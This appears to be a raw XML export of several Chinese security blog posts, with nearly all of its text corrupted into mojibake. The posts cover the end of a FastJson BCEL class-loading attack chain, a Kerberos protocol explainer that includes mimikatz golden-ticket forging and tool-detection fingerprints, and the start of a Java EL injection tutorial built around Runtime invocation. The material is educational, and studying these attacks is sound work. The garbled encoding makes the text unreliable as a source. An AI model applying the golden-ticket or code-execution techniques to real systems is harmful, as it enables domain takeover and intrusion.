<p>æœ‰ä¸€å®šåŸºç¡€çš„æœ‹å‹å°±ä¼šå‘ç°ï¼Œåªæ˜¯æ³¨å…¥äº†ç±»åå’Œç±»åŠ è½½å™¨å¹¶ä¸è¶³ä»¥è§¦å‘ç±»åŠ è½½ï¼Œå¯¼è‡´å‘½ä»¤æ‰§è¡Œçš„å…³é”®é—®é¢˜å°±åœ¨äºFastJsonä¼šè‡ªåŠ¨è°ƒç”¨getteræ–¹æ³•ï¼Œ<code>org.apache.commons.dbcp.BasicDataSource</code>æœ¬æ²¡æœ‰<code>connection</code>æˆå‘˜å˜é‡ï¼Œä½†æœ‰ä¸€ä¸ª<code>getConnection()</code>æ–¹æ³•ï¼ŒæŒ‰ç†æ¥è®²åº”è¯¥ä¸ä¼šè°ƒç”¨<code>getConnection()</code>æ–¹æ³•ï¼Œä½†æ˜¯FastJsonä¼šé€šè¿‡<code>getConnection()</code>è¿™ä¸ªæ–¹æ³•åè®¡ç®—å‡ºä¸€ä¸ªåä¸º<code>connection</code>çš„fieldï¼Œå› æ­¤FastJsonæœ€ç»ˆè¿˜æ˜¯è°ƒç”¨äº†<code>getConnection()</code>æ–¹æ³•ã€‚</p>
<p>å½“<code>getConnection()</code>æ–¹æ³•è¢«è°ƒç”¨æ—¶å°±ä¼šä½¿ç”¨æ³¨å…¥è¿›æ¥çš„<code>org.apache.bcel.util.ClassLoader</code>ç±»åŠ è½½å™¨åŠ è½½æ³¨å…¥è¿›æ¥æ¶æ„ç±»å­—èŠ‚ç </p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownimage_DR1kCydpgI.png"></p>
<p>æ³¨æ„ï¼šJavaå°†BCELå‡çº§åˆ°6.0æ—¶ç”¨çš„æ˜¯ä¸€ä¸ªåˆ é™¤äº†ClassLoaderç‰ˆæœ¬çš„BCELï¼Œæ‰€ä»¥è¿™ä¸ªåˆ©ç”¨é“¾åªèƒ½ç”¨æ¥å­¦ä¹ ã€‚</p>
]]></content>
      <categories>
        <category>Webå®‰å…¨</category>
      </categories>
      <tags>
        <tag>BCEL</tag>
        <tag>JAVA</tag>
      </tags>
  </entry>
  <entry>
    <title>Kerberosè¯¦è§£</title>
    <url>/windows/Kerberos/</url>
    <content><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>åˆæ°´ä¸€ç¯‡æ–‡ï¼Œä¸æ„§æ˜¯æˆ‘ğŸ¤£</p>
<span id="more"></span>

<h1 id="kerberos-åè®®æ¦‚è¿°"><a href="#kerberos-åè®®æ¦‚è¿°" class="headerlink" title="kerberos åè®®æ¦‚è¿°"></a>kerberos åè®®æ¦‚è¿°</h1><p><code>Kerberos</code>æ˜¯ä¸€ç§ç”±MITï¼ˆéº»çœç†å·¥å¤§å­¦ï¼‰æå‡ºçš„ä¸€ç§<strong>ç½‘ç»œèº«ä»½éªŒè¯åè®®</strong>ã€‚å®ƒæ—¨åœ¨é€šè¿‡ä½¿ç”¨å¯†é’¥åŠ å¯†æŠ€æœ¯ä¸º<code>å®¢æˆ·ç«¯</code>&#x2F;<code>æœåŠ¡å™¨åº”ç”¨ç¨‹åº</code>æä¾›<strong>å¼ºèº«ä»½éªŒè¯</strong>ã€‚</p>
<p>åœ¨<code>Kerberos</code>åè®®ä¸­ä¸»è¦æ˜¯æœ‰ä¸‰ä¸ªè§’è‰²çš„å­˜åœ¨ï¼š</p>
<ol>
<li><p>è®¿é—®æœåŠ¡çš„<code>Client</code>(ä»¥ä¸‹è¡¨è¿°ä¸ºClient æˆ–è€…ç”¨æˆ·)</p>
</li>
<li><p>æä¾›æœåŠ¡çš„<code>Server</code>(ä»¥ä¸‹è¡¨è¿°ä¸ºæœåŠ¡)</p>
</li>
<li><p><code>KDC</code>ï¼ˆKey Distribution Centerï¼‰å¯†é’¥åˆ†å‘ä¸­å¿ƒ kerberos æµ‹è¯•å·¥å…·ä»‹ç»</p>
</li>
</ol>
<p>å…¶ä¸­KDCæœåŠ¡é»˜è®¤ä¼šå®‰è£…åœ¨ä¸€ä¸ªåŸŸçš„åŸŸæ§ä¸­ï¼Œè€ŒClientå’ŒServerä¸ºåŸŸå†…çš„ç”¨æˆ·æˆ–è€…æ˜¯æœåŠ¡ï¼Œå¦‚HTTPæœåŠ¡ï¼ŒSQLæœåŠ¡ã€‚åœ¨<code>Kerberos</code>ä¸­<code>Client</code>æ˜¯å¦æœ‰æƒé™è®¿é—®<code>Server</code>ç«¯çš„æœåŠ¡ç”±<code>KDC</code>å‘æ”¾çš„ç¥¨æ®æ¥å†³å®šã€‚</p>
<p>kerberosçš„ç®€åŒ–è®¤è¯è®¤è¯è¿‡ç¨‹å¦‚ä¸‹å›¾</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownimage_vEQeoGFNDQ.png"></p>
<ol>
<li><p><code>AS_REQ</code>: Clientå‘KDCå‘èµ·AS_REQ,è¯·æ±‚å‡­æ®æ˜¯<strong>Client hashåŠ å¯†çš„æ—¶é—´æˆ³</strong></p>
</li>
<li><p><code>AS_REP</code>: KDCä½¿ç”¨Client hashè¿›è¡Œè§£å¯†ï¼Œå¦‚æœç»“æœæ­£ç¡®å°±è¿”å›ç”¨<strong>krbtgt hashåŠ å¯†çš„TGTç¥¨æ®</strong>ï¼ŒTGTé‡Œé¢åŒ…å«PAC,PACåŒ…å«Clientçš„sidï¼ŒClientæ‰€åœ¨çš„ç»„ã€‚</p>
</li>
<li><p><code>TGS_REQ</code>: Client<strong>å‡­å€ŸTGTç¥¨æ®å‘KDCå‘èµ·é’ˆå¯¹ç‰¹å®šæœåŠ¡çš„</strong><code>TGS_REQ</code><strong>è¯·æ±‚</strong></p>
</li>
<li><p><code>TGS_REP</code>: KDCä½¿ç”¨krbtgt hashè¿›è¡Œè§£å¯†ï¼Œå¦‚æœç»“æœæ­£ç¡®ï¼Œå°±è¿”å›ç”¨æœåŠ¡hash åŠ å¯†çš„TGSç¥¨æ®(è¿™ä¸€æ­¥ä¸ç®¡ç”¨æˆ·æœ‰æ²¡æœ‰è®¿é—®æœåŠ¡çš„æƒé™ï¼Œåªè¦TGTæ­£ç¡®ï¼Œå°±è¿”å›TGSç¥¨æ®)</p>
</li>
<li><p><code>AP_REQ</code>: Clientæ‹¿ç€TGSç¥¨æ®å»è¯·æ±‚æœåŠ¡</p>
</li>
<li><p><code>AP_REP</code>: æœåŠ¡ä½¿ç”¨è‡ªå·±çš„hashè§£å¯†TGSç¥¨æ®ã€‚å¦‚æœè§£å¯†æ­£ç¡®ï¼Œå°±æ‹¿ç€PACå»KDCé‚£è¾¹é—®Clientæœ‰æ²¡æœ‰è®¿é—®æƒé™ï¼ŒåŸŸæ§è§£å¯†PACã€‚è·å–Clientçš„sidï¼Œä»¥åŠæ‰€åœ¨çš„ç»„ï¼Œå†æ ¹æ®è¯¥æœåŠ¡çš„ACLï¼Œåˆ¤æ–­Clientæ˜¯å¦æœ‰è®¿é—®æœåŠ¡çš„æƒé™ã€‚</p>
</li>
</ol>
<h1 id="AS-REQ"><a href="#AS-REQ" class="headerlink" title="AS_REQ"></a>AS_REQ</h1><h2 id="pvno"><a href="#pvno" class="headerlink" title="pvno"></a>pvno</h2><p>kerberos ç‰ˆæœ¬å·</p>
<h2 id="msg-type"><a href="#msg-type" class="headerlink" title="msg-type"></a>msg-type</h2><p>ç±»å‹ï¼ŒAS_REQå¯¹åº”çš„å°±æ˜¯KRB_AS_REQ(0x0a)</p>
<h2 id="PA-DATA"><a href="#PA-DATA" class="headerlink" title="PA_DATA"></a>PA_DATA</h2><p>ä¸»è¦æ˜¯ä¸€äº›è®¤è¯ä¿¡æ¯ã€‚ä¸€ä¸ªåˆ—è¡¨ï¼ŒåŒ…å«è‹¥å¹²ä¸ªè®¤è¯æ¶ˆæ¯ç”¨äºè®¤è¯ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥Authenticatorã€‚æ¯ä¸ªè®¤è¯æ¶ˆæ¯æœ‰typeå’Œvalueã€‚</p>
<p>typeä¸»è¦æœ‰ä»¥ä¸‹ä¸€äº›</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">            NONE = <span class="number">0</span>,</span><br><span class="line">â€‹            TGS_REQ = <span class="number">1</span>,</span><br><span class="line">â€‹            AP_REQ = <span class="number">1</span>,</span><br><span class="line">â€‹            ENC_TIMESTAMP = <span class="number">2</span>,</span><br><span class="line">â€‹            PW_SALT = <span class="number">3</span>,</span><br><span class="line">â€‹            ENC_UNIX_TIME = <span class="number">5</span>,</span><br><span class="line">â€‹            SANDIA_SECUREID = <span class="number">6</span>,</span><br><span class="line">â€‹            SESAME = <span class="number">7</span>,</span><br><span class="line">â€‹            OSF_DCE = <span class="number">8</span>,</span><br><span class="line">â€‹            CYBERSAFE_SECUREID = <span class="number">9</span>,</span><br><span class="line">â€‹            AFS3_SALT = <span class="number">10</span>,</span><br><span class="line">â€‹            ETYPE_INFO = <span class="number">11</span>,</span><br><span class="line">â€‹            SAM_CHALLENGE = <span class="number">12</span>,</span><br><span class="line">â€‹            SAM_RESPONSE = <span class="number">13</span>,</span><br><span class="line">â€‹            PK_AS_REQ_19 = <span class="number">14</span>,</span><br><span class="line">â€‹            PK_AS_REP_19 = <span class="number">15</span>,</span><br><span class="line">â€‹            PK_AS_REQ_WIN = <span class="number">15</span>,</span><br><span class="line">â€‹            PK_AS_REQ = <span class="number">16</span>,</span><br><span class="line">â€‹            PK_AS_REP = <span class="number">17</span>,</span><br><span class="line">â€‹            PA_PK_OCSP_RESPONSE = <span class="number">18</span>,</span><br><span class="line">â€‹            ETYPE_INFO2 = <span class="number">19</span>,</span><br><span class="line">â€‹            USE_SPECIFIED_KVNO = <span class="number">20</span>,</span><br><span class="line">â€‹            SVR_REFERRAL_INFO = <span class="number">20</span>,</span><br><span class="line">â€‹            SAM_REDIRECT = <span class="number">21</span>,</span><br><span class="line">â€‹            GET_FROM_TYPED_DATA = <span class="number">22</span>,</span><br><span class="line">â€‹            SAM_ETYPE_INFO = <span class="number">23</span>,</span><br><span class="line">â€‹            SERVER_REFERRAL = <span class="number">25</span>,</span><br><span class="line">â€‹            TD_KRB_PRINCIPAL = <span class="number">102</span>,</span><br><span class="line">â€‹            PK_TD_TRUSTED_CERTIFIERS = <span class="number">104</span>,</span><br><span class="line">â€‹            PK_TD_CERTIFICATE_INDEX = <span class="number">105</span>,</span><br><span class="line">â€‹            TD_APP_DEFINED_ERROR = <span class="number">106</span>,</span><br><span class="line">â€‹            TD_REQ_NONCE = <span class="number">107</span>,</span><br><span class="line">â€‹            TD_REQ_SEQ = <span class="number">108</span>,</span><br><span class="line">â€‹            PA_PAC_REQUEST = <span class="number">128</span>,</span><br><span class="line">â€‹            S4U2SELF = <span class="number">129</span>,</span><br><span class="line">â€‹            PA_PAC_OPTIONS = <span class="number">167</span>,</span><br><span class="line">â€‹            PK_AS_09_BINDING = <span class="number">132</span>,</span><br><span class="line">â€‹            CLIENT_CANONICALIZED = <span class="number">133</span></span><br></pre></td></tr></table></figure>

<p>åœ¨AS_REQé˜¶æ®µä¸»è¦ç”¨åˆ°çš„æœ‰ä¸¤ä¸ª</p>
<ul>
<li><p><code>ENC_TIMESTAMP</code></p>
<p>è¿™ä¸ªæ˜¯<strong>é¢„è®¤è¯</strong>ï¼Œå°±æ˜¯ç”¨ç”¨æˆ·hashåŠ å¯†æ—¶é—´æˆ³ï¼Œä½œä¸ºvalue å‘é€ç»™ASæœåŠ¡å™¨ã€‚ç„¶åASæœåŠ¡å™¨é‚£è¾¹æœ‰ç”¨æˆ·hashï¼Œä½¿ç”¨ç”¨æˆ·hashè¿›è¡Œè§£å¯†ï¼Œè·å¾—æ—¶é—´æˆ³ï¼Œå¦‚æœèƒ½è§£å¯†ï¼Œä¸”æ—¶é—´æˆ³åœ¨ä¸€å®šçš„èŒƒå›´å†…ï¼Œåˆ™è¯æ˜è®¤è¯é€šè¿‡</p>
</li>
<li><p><code>PA_PAC_REQUEST</code></p>
<p>è¿™ä¸ªæ˜¯å¯ç”¨PACæ”¯æŒçš„æ‰©å±•ã€‚PAC(Privilege Attribute Certificate)å¹¶ä¸åœ¨åŸç”Ÿçš„kerberosé‡Œé¢ï¼Œæ˜¯å¾®è½¯å¼•è¿›çš„æ‰©å±•ã€‚è¯¦ç»†çš„å†…å®¹ä¹‹åå°†æœ‰ä¸€ç¯‡æ–‡ç« è¯¦ç»†ä»‹ç»PACã€‚PACåŒ…å«åœ¨AS_REQçš„å“åº”body(AS_REP)ã€‚è¿™é‡Œçš„valueå¯¹åº”çš„æ˜¯include&#x3D;trueæˆ–è€…include&#x3D;false(KDCæ ¹æ®includeçš„å€¼æ¥åˆ¤æ–­è¿”å›çš„ç¥¨æ®ä¸­æ˜¯å¦æºå¸¦PAC)ã€‚</p>
</li>
</ul>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownimage_ovs2R1tk4p.png"></p>
<h2 id="REQ-BODY"><a href="#REQ-BODY" class="headerlink" title="REQ_BODY"></a>REQ_BODY</h2><ul>
<li>kdc-options ä¸€äº›flag å­—æ®µ</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">  VALIDATE = <span class="number">0x00000001</span>,</span><br><span class="line">â€‹              RENEW = <span class="number">0x00000002</span>,</span><br><span class="line">â€‹              UNUSED29 = <span class="number">0x00000004</span>,</span><br><span class="line">â€‹              ENCTKTINSKEY = <span class="number">0x00000008</span>,</span><br><span class="line">â€‹              RENEWABLEOK = <span class="number">0x00000010</span>,</span><br><span class="line">â€‹              DISABLETRANSITEDCHECK = <span class="number">0x00000020</span>,</span><br><span class="line">â€‹              UNUSED16 = <span class="number">0x0000FFC0</span>,</span><br><span class="line">â€‹              CANONICALIZE = <span class="number">0x00010000</span>,</span><br><span class="line">â€‹              CNAMEINADDLTKT = <span class="number">0x00020000</span>,</span><br><span class="line">â€‹              OK_AS_DELEGATE = <span class="number">0x00040000</span>,</span><br><span class="line">â€‹              UNUSED12 = <span class="number">0x00080000</span>,</span><br><span class="line">â€‹              OPTHARDWAREAUTH = <span class="number">0x00100000</span>,</span><br><span class="line">â€‹              PREAUTHENT = <span class="number">0x00200000</span>,</span><br><span class="line">â€‹              INITIAL = <span class="number">0x00400000</span>,</span><br><span class="line">â€‹              RENEWABLE = <span class="number">0x00800000</span>,</span><br><span class="line">â€‹              UNUSED7 = <span class="number">0x01000000</span>,</span><br><span class="line">â€‹              POSTDATED = <span class="number">0x02000000</span>,</span><br><span class="line">â€‹              ALLOWPOSTDATE = <span class="number">0x04000000</span>,</span><br><span class="line">â€‹              PROXY = <span class="number">0x08000000</span>,</span><br><span class="line">â€‹              PROXIABLE = <span class="number">0x10000000</span>,</span><br><span class="line">â€‹              FORWARDED = <span class="number">0x20000000</span>,</span><br><span class="line">â€‹              FORWARDABLE = <span class="number">0x40000000</span>,</span><br><span class="line">â€‹              RESERVED = <span class="number">0x80000000</span></span><br></pre></td></tr></table></figure>

<ul>
<li><p>cname</p>
<p>PrincipalName ç±»å‹ã€‚PrincipalNameåŒ…å«typeå’Œvalueã€‚</p>
<ul>
<li><p>KRB_NT_PRINCIPAL &#x3D; 1 means just the name of the principal å¦‚dailker</p>
</li>
<li><p>KRB_NT_SRV_INST &#x3D; 2 service and other unique instance (krbtgt) å¦‚krbtgtï¼Œcifs</p>
</li>
<li><p>KRB_NT_ENTERPRISE_PRINCIPAL &#x3D; 10 å¦‚ <a href="mailto:user@domain.com" title="user@domain.com">user@domain.com</a></p>
</li>
</ul>
<p>åœ¨AS_REQé‡Œé¢cname æ˜¯è¯·æ±‚çš„ç”¨æˆ·,è¿™ä¸ªç”¨æˆ·åå­˜åœ¨å’Œä¸å­˜åœ¨ï¼Œè¿”å›çš„åŒ…æœ‰å·®å¼‚ï¼Œå¯ä»¥ç”¨äºæšä¸¾åŸŸå†…ç”¨æˆ·åã€‚è¯¦æƒ…è§<a href="/windows-protocol/kerberos/1#%E7%9B%B8%E5%85%B3%E7%9A%84%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98" title="ç›¸å…³çš„å®‰å…¨é—®é¢˜&gt;ç”¨æˆ·åæšä¸¾">ç›¸å…³çš„å®‰å…¨é—®é¢˜&gt;ç”¨æˆ·åæšä¸¾</a></p>
</li>
<li><p>sname</p>
<p>PrincipalName ç±»å‹</p>
<p>åœ¨AS_REQé‡Œé¢snameæ˜¯krbtgtï¼Œç±»å‹æ˜¯KRB_NT_SRV_INST</p>
</li>
<li><p>realm</p>
<p>åŸŸå</p>
</li>
<li><p>from</p>
<p>å‘é€æ—¶é—´</p>
</li>
<li><p>till</p>
<p>åˆ°æœŸæ—¶é—´ï¼Œrubeuså’Œkekeoéƒ½æ˜¯20370913024805Zï¼Œè¿™ä¸ªå¯ä»¥ä½œä¸º<code>ç‰¹å¾</code>æ¥æ£€æµ‹å·¥å…·ã€‚</p>
</li>
<li><p>nonce</p>
<p>éšæœºç”Ÿæˆçš„ä¸€ä¸ªæ•°kekeo&#x2F;mimikatz nonceæ˜¯12381973ï¼Œrubeus nonceæ˜¯1818848256ï¼Œè¿™ä¸ªä¹Ÿå¯ä»¥ç”¨æ¥ä½œä¸º<code>ç‰¹å¾</code>æ£€æµ‹å·¥å…·ã€‚</p>
</li>
<li><p>etype</p>
<p>åŠ å¯†ç±»å‹ï¼Œæœ‰</p>
</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">             des_cbc_crc = <span class="number">1</span>,</span><br><span class="line">â€‹             des_cbc_md4 = <span class="number">2</span>,</span><br><span class="line">â€‹             des_cbc_md5 = <span class="number">3</span>,</span><br><span class="line">â€‹             des3_cbc_md5 = <span class="number">5</span>,</span><br><span class="line">â€‹             des3_cbc_sha1 = <span class="number">7</span>,</span><br><span class="line">â€‹             dsaWithSHA1_CmsOID = <span class="number">9</span>,</span><br><span class="line">â€‹             md5WithRSAEncryption_CmsOID = <span class="number">10</span>,</span><br><span class="line">â€‹             sha1WithRSAEncryption_CmsOID = <span class="number">11</span>,</span><br><span class="line">â€‹             rc2CBC_EnvOID = <span class="number">12</span>,</span><br><span class="line">â€‹             rsaEncryption_EnvOID = <span class="number">13</span>,</span><br><span class="line">â€‹             rsaES_OAEP_ENV_OID = <span class="number">14</span>,</span><br><span class="line">â€‹             des_ede3_cbc_Env_OID = <span class="number">15</span>,</span><br><span class="line">â€‹             des3_cbc_sha1_kd = <span class="number">16</span>,</span><br><span class="line">â€‹             aes128_cts_hmac_sha1 = <span class="number">17</span>,</span><br><span class="line">â€‹             aes256_cts_hmac_sha1 = <span class="number">18</span>,</span><br><span class="line">â€‹             rc4_hmac = <span class="number">23</span>,</span><br><span class="line">â€‹             rc4_hmac_exp = <span class="number">24</span>,</span><br><span class="line">â€‹             subkey_keymaterial = <span class="number">65</span></span><br></pre></td></tr></table></figure>

<p>è¿™ä¸ªåœ°æ–¹è¦æ³¨æ„çš„æ˜¯å¦‚æœåœ¨é…ç½®é‡Œé¢é€‰æ‹©ç”¨hash(ä¸æ˜¯plaintext)çš„è¯ï¼Œhashçš„åŠ å¯†ç±»å‹ï¼Œè¦è·Ÿetypeä¸€æ ·ã€‚å› ä¸ºKDCæ˜¯æŒ‰ç…§etypeç±»å‹é€‰æ‹©ç”¨æˆ·å¯¹åº”åŠ å¯†æ–¹å¼çš„hashï¼Œå¦‚æœæ˜¯é€‰æ‹©æ˜æ–‡(plaintext)ï¼Œé‚£ä¹ˆclient ä¼šæŒ‰ç…§etypeé‡Œé¢çš„åŠ å¯†æ–¹å¼å°†æ˜æ–‡åŠ å¯†æˆhashã€‚</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownimage_gDOZ_LL2q7.png"></p>
<h1 id="é»„é‡‘ç¥¨æ®"><a href="#é»„é‡‘ç¥¨æ®" class="headerlink" title="é»„é‡‘ç¥¨æ®"></a>é»„é‡‘ç¥¨æ®</h1><p>åœ¨AS_REPé‡Œé¢çš„ticketçš„encpartæ˜¯ä½¿ç”¨krbtgtçš„hashè¿›è¡ŒåŠ å¯†çš„ï¼Œå¦‚æœæˆ‘ä»¬æ‹¥æœ‰krbtgtçš„hashï¼Œå°±å¯ä»¥ç»™æˆ‘ä»¬è‡ªå·±ç­¾å‘ä»»æ„ç”¨æˆ·çš„TGTç¥¨æ®ï¼Œè¿™ä¸ªç¥¨æ®ä¹Ÿè¢«ç§°ä¸ºé»„é‡‘ç¥¨æ®ã€‚</p>
<h2 id="mimikatz"><a href="#mimikatz" class="headerlink" title="mimikatz"></a>mimikatz</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">kerberos::golden</span><br></pre></td></tr></table></figure>

<p><code>mimikatz</code>çš„<code>kerberos::golden</code>æ¨¡å—å¯ä»¥ç”¨äºåˆ¶ä½œé»„é‡‘ç¥¨æ®,ç¥¨æ®æ ¼å¼æ˜¯<code>.kirbi</code></p>
<p>é¦–å…ˆè·å–krbtgtçš„hash</p>
<p><img src="https://p0.ssl.qhimg.com/t0103e479df6f95c9ab.png"></p>
<p>è·å–åŸŸçš„sid</p>
<p><img src="https://p5.ssl.qhimg.com/t017ed9b1c7d455c5d2.png"></p>
<p>åˆ¶ä½œé»„é‡‘ç¥¨æ®</p>
<p><img src="https://p5.ssl.qhimg.com/t01ae3c1d04ccc46dfc.png"></p>
]]></content>
      <categories>
        <category>windowsè®¤è¯æœºåˆ¶</category>
      </categories>
      <tags>
        <tag>Kerberos</tag>
      </tags>
  </entry>
  <entry>
    <title>JavaELè¡¨è¾¾å¼æ³¨å…¥</title>
    <url>/Inject/JAVA%20EL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/</url>
    <content><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a><center>å‰è¨€</center></h1><p>ä¹‹å‰ä¸€ç›´æ‰“ç®—å†™ä¸€ç¯‡è§£æï¼Œæ‹–äº†ä¸€ä¹…å°±å¼€å§‹å†™äº†ã€‚</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownAvYBeWiOuR3talo.png"></p>
<span id="more"></span>

<h1 id="JAVAåå°„æœºåˆ¶"><a href="#JAVAåå°„æœºåˆ¶" class="headerlink" title="JAVAåå°„æœºåˆ¶"></a><center>JAVAåå°„æœºåˆ¶</center></h1><h2 id="åŸç†"><a href="#åŸç†" class="headerlink" title="åŸç†"></a>åŸç†</h2><p>JAVAåå°„æœºåˆ¶æ˜¯åœ¨è¿è¡ŒçŠ¶æ€ä¸­ï¼Œ<strong>å¯¹äºä»»æ„ä¸€ä¸ªç±»ï¼Œéƒ½èƒ½å¤ŸçŸ¥é“è¿™ä¸ªç±»çš„æ‰€æœ‰å±æ€§å’Œæ–¹æ³•</strong>ï¼›<strong>å¯¹äºä»»æ„ä¸€ä¸ªå¯¹è±¡ï¼Œéƒ½èƒ½å¤Ÿè°ƒç”¨å®ƒçš„ä»»æ„ä¸€ä¸ªæ–¹æ³•å’Œå±æ€§</strong>ï¼›è¿™ç§<code>åŠ¨æ€è·å–çš„ä¿¡æ¯</code>ä»¥åŠ<code>åŠ¨æ€è°ƒç”¨å¯¹è±¡</code>çš„æ–¹æ³•çš„åŠŸèƒ½ç§°ä¸º<code>javaè¯­è¨€çš„åå°„æœºåˆ¶</code>ã€‚<br>è¦æƒ³è§£å‰–ä¸€ä¸ªç±»,å¿…é¡»å…ˆè¦è·å–åˆ°è¯¥ç±»çš„å­—èŠ‚ç æ–‡ä»¶å¯¹è±¡ã€‚è€Œè§£å‰–ä½¿ç”¨çš„å°±æ˜¯Classç±»ä¸­çš„æ–¹æ³•.æ‰€ä»¥å…ˆè¦è·å–åˆ°æ¯ä¸€ä¸ªå­—èŠ‚ç æ–‡ä»¶å¯¹åº”çš„Classç±»å‹çš„å¯¹è±¡.</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdowngSvljhYbHELAnpt.png"></p>
<ul>
<li>Javaä¸­ç¼–è¯‘ç±»å‹æœ‰ä¸¤ç§ï¼š<ul>
<li><strong>é™æ€ç¼–è¯‘</strong>ï¼šåœ¨ç¼–è¯‘æ—¶ç¡®å®šç±»å‹ï¼Œç»‘å®šå¯¹è±¡å³é€šè¿‡ã€‚</li>
<li><strong>åŠ¨æ€ç¼–è¯‘</strong>ï¼šè¿è¡Œæ—¶ç¡®å®šç±»å‹ï¼Œç»‘å®šå¯¹è±¡ã€‚åŠ¨æ€ç¼–è¯‘æœ€å¤§é™åº¦åœ°å‘æŒ¥äº†Javaçš„çµæ´»æ€§ï¼Œä½“ç°äº†å¤šæ€çš„åº”ç”¨ï¼Œå¯ä»¥å‡ä½ç±»ä¹‹é—´çš„è€¦åˆæ€§ã€‚</li>
</ul>
</li>
<li>å®ç°Javaåå°„æœºåˆ¶çš„ç±»éƒ½ä½äº<code>java.lang.reflect</code>åŒ…ä¸­ï¼š<ol>
<li>Classç±»ï¼šä»£è¡¨ä¸€ä¸ªç±»</li>
<li>Fieldç±»ï¼šä»£è¡¨ç±»çš„æˆå‘˜å˜é‡ï¼ˆç±»çš„å±æ€§ï¼‰</li>
<li>Methodç±»ï¼šä»£è¡¨ç±»çš„æ–¹æ³•</li>
<li>Constructorç±»ï¼šä»£è¡¨ç±»çš„æ„é€ æ–¹æ³•</li>
<li>Arrayç±»ï¼šæä¾›äº†åŠ¨æ€åˆ›å»ºæ•°ç»„ï¼Œä»¥åŠè®¿é—®æ•°ç»„çš„å…ƒç´ çš„é™æ€æ–¹æ³•</li>
</ol>
</li>
</ul>
<p><strong>ä¸€å¥è¯æ¦‚æ‹¬å°±æ˜¯ä½¿ç”¨åå°„å¯ä»¥èµ‹äºˆjvmåŠ¨æ€ç¼–è¯‘çš„èƒ½åŠ›ï¼Œå¦åˆ™ç±»çš„å…ƒæ•°æ®ä¿¡æ¯åªèƒ½ç”¨é™æ€ç¼–è¯‘çš„æ–¹å¼å®ç°ï¼Œä¾‹å¦‚çƒ­åŠ è½½ï¼ŒTomcatçš„classloaderç­‰ç­‰éƒ½æ²¡æ³•æ”¯æŒã€‚</strong></p>
<h1 id="ELè¡¨è¾¾å¼åŸºç¡€"><a href="#ELè¡¨è¾¾å¼åŸºç¡€" class="headerlink" title="ELè¡¨è¾¾å¼åŸºç¡€"></a><center>ELè¡¨è¾¾å¼åŸºç¡€</center></h1><p>ELè¡¨è¾¾å¼æ˜¯ä¸ºäº†è½¬åŒ–ä¸ºJSPä»£ç çš„ï¼Œç®€æ´è¡¨è¾¾å¼å½¢å¼ï¼Œç›¸æ¯”ç›´æ¥ä½¿ç”¨JSPï¼ŒELè¡¨è¾¾å¼æ‹¥æœ‰æ›´å¥½çš„å¯è¯»æ€§ã€‚</p>
<p>EL è¡¨è¾¾å¼è¯­æ³•å¦‚ä¸‹ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">$&#123;ELè¡¨è¾¾å¼&#125;</span><br></pre></td></tr></table></figure>


<p>EL è¡¨è¾¾å¼è¯­æ³•ä»¥<code>$&#123;</code>å¼€å¤´ï¼Œä»¥<code>&#125;</code>ç»“æŸï¼Œä¸­é—´ä¸ºåˆæ³•çš„è¡¨è¾¾å¼ã€‚</p>
<h1 id="ELè¡¨è¾¾å¼æ³¨å…¥åŸç†è§£æ"><a href="#ELè¡¨è¾¾å¼æ³¨å…¥åŸç†è§£æ" class="headerlink" title="ELè¡¨è¾¾å¼æ³¨å…¥åŸç†è§£æ"></a><center>ELè¡¨è¾¾å¼æ³¨å…¥åŸç†è§£æ</center></h1><p><code>pagecontext</code>åŸŸå¯æ“çºµ<code>request</code> <code>session</code> <code>application</code>ï¼Œè€Œè¿™å‡ ä¸ªåŸŸé‡Œé¢å‡æœ‰setAttributeæ–¹æ³•</p>
<ul>
<li><p>Attributeæ–¹æ³•</p>
<ul>
<li>è¿™ä¸ªæ–¹æ³•ä½œç”¨å°±æ˜¯<strong>ä¿å­˜æ•°æ®</strong>ï¼Œç„¶åè¿˜å¯ä»¥ç”¨<code>getAttribute</code>æ–¹æ³•æ¥å–å‡ºã€‚</li>
</ul>
</li>
<li><p>åå°„ä¸­çš„Methodç±»çš„invoke() å’ŒgetMethod()</p>
<ul>
<li>getMethod() â†’ è·å¾—å¯¹è±¡æ‰€å£°æ˜çš„å…¬å¼€æ–¹æ³•  <figure class="highlight java"><table><tr><td class="code"><pre><span class="line">person.getClass().getMethod(<span class="string">&quot;Speak&quot;</span>, <span class="literal">null</span>);</span><br></pre></td></tr></table></figure>
  è·å¾—personå¯¹è±¡çš„Speakæ–¹æ³•ï¼Œå› ä¸ºSpeakæ–¹æ³•æ²¡æœ‰å½¢å‚ï¼Œæ‰€ä»¥parameterTypesä¸ºnull</li>
</ul>
</li>
<li><p>getRuntime()æ–¹æ³•<br>  <code>java.lang.Runtime.getRuntime() </code>æ–¹æ³•è¿”å›ä¸å½“å‰Javaåº”ç”¨ç¨‹åºç›¸å…³çš„è¿è¡Œæ—¶å¯¹è±¡ã€‚å¤§å¤šæ•°Runtimeç±»çš„æ–¹æ³•æ˜¯å®ä¾‹æ–¹æ³•ï¼Œå¿…é¡»ç›¸å¯¹äºå½“å‰çš„è¿è¡Œæ—¶å¯¹è±¡è¢«è°ƒç”¨ã€‚</p>
</li>
<li><p>invoke()æ–¹æ³•</p>
<ul>
<li>æ‰§â¾å‡½æ•°çš„â½…æ³•</li>
</ul>
</li>
<li><p>getInputStreamæ–¹æ³•</p>
<ul>
<li><code>getInputStream()æ–¹æ³•</code>åœ¨java.langåŒ…ä¸­å¯ç”¨ã€‚</li>
